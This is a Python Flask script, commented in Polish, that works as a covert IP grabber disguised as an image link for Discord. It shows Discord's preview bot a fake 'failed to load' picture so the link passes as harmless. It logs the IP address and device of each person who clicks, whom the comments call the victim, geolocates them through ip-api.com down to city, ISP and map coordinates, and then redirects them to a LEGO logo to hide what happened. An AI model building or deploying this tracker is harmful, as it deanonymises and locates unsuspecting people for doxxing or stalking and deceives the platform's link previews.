from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Bezpośredni link do grafiki "Failed to load" (musi być linkiem do pliku)
REDDIT_ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
# Prawdziwe zdjęcie dla ofiary
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/image.png') # Zmienione na .png, żeby Discord "łyknął" podgląd
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # 1. Jeśli to bot Discorda - dostaje obrazek błędu
    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DISCORDA POBIERA PODGLĄD ---")
        return redirect(REDDIT_ERROR_IMG)

    # 2. LOGOWANIE DANYCH DO KONSOLI RENDERA
    print(f"\n[!!!] OFIARA KLIKNĘŁA [!!!]")
    print(f"IP: {ip}")
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}")
            print(f"MAPA: https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}")
    except:
        pass

    print(f"URZĄDZENIE: {ua}")
    print(f"-----------------------------------\n")

    # 3. Przekierowanie do LEGO
    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
